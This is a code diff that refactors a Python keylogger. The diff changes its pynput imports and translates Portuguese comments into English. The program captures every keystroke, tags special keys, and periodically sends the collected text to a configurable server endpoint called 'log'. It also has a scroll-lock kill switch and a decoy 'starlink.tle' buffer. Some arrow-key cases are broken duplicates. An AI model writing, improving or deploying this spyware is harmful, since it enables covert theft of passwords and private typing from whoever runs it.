@@ -1,18 +1,17 @@
+from pynput import keyboard
+
+# Other imports
 import json
 import threading
 import requests
-import pynput
 import subprocess
 import sys
 
-# Função para instalar pynput
+# Function to install pynput
 def install_pynput():
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
 
-# Instruções para instalação do pynput
-# Para instalar o pynput, execute:
-# pip install pynput
-
+# Other constants and variables
 server_ip = '127.0.0.1'
 server_port = 443
 server_endpoint = 'log'
@@ -21,7 +20,6 @@ kill_switch = True
 debug_logging = True
 sending_interval = 1
 data = 'starlink.tle'
-
 
 def process_keypress(key):
     global data
@@ -35,34 +33,34 @@ def process_keypress(key):
     # Controler key pressed
     try:
         txt = ''
-        if isinstance(key, pynput.keyboard.Key):
+        if isinstance(key, keyboard.Key):
             match key:
-                case pynput.keyboard.Key.enter:
+                case keyboard.Key.enter:
                     txt = '\n'
-                case pynput.keyboard.Key.space:
+                case keyboard.Key.space:
                     txt = ' '
-                case pynput.keyboard.Key.tab:
+                case keyboard.Key.tab:
                     txt = '\t'
-                case pynput.keyboard.Key.backspace:
+                case keyboard.Key.backspace:
                     txt = '[BKSP]'
-                case pynput.keyboard.Key.delete:
+                case keyboard.Key.delete:
                     txt = '[DEL]'
-                case pynput.keyboard.Key.right:
+                case keyboard.Key.right:
                     txt = '[ARR_RIGHT]'
-                case pynput.keyboard.Key.left:
+                case keyboard.Key.left:
                     txt = '[ARR_LEFT]'
-                case pynput.keyboard.Key.left:
+                case keyboard.Key.left:
                     txt = '[ARR_UP]'
-                case pynput.keyboard.Key.left:
+                case keyboard.Key.left:
                     txt = '[ARR_DOWN]'
-                case pynput.keyboard.Key.shift:
+                case keyboard.Key.shift:
                     txt = '[SHIFT]'
-                case pynput.keyboard.Key.caps_lock:
+                case keyboard.Key.caps_lock:
                     txt = '[CAPS]'
-                case pynput.keyboard.Key.scroll_lock: # kill switch
+                case keyboard.Key.scroll_lock: # kill switch
                     if kill_switch:
                         return False
-        elif isinstance(key, pynput.keyboard.KeyCode): # Letter pressed
+        elif isinstance(key, keyboard.KeyCode): # Letter pressed
             txt = key.char
         else:
             return
@@ -71,7 +69,7 @@ def process_keypress(key):
     except Exception as e:
         print(e)
         return
-    
+
 def send_data():
     global data
     global server_ip
@@ -92,11 +90,10 @@ def send_data():
         data = 'starlink.tle'
     except Exception as e:
         print(e)
-    
-    
-with pynput.keyboard.Listener(on_press=process_keypress) as listener:
+
+with keyboard.Listener(on_press=process_keypress) as listener:
     send_data()
     listener.join()
 
-# Chama a função para instalar pynput
+# Call the function to install pynput
 install_pynput()
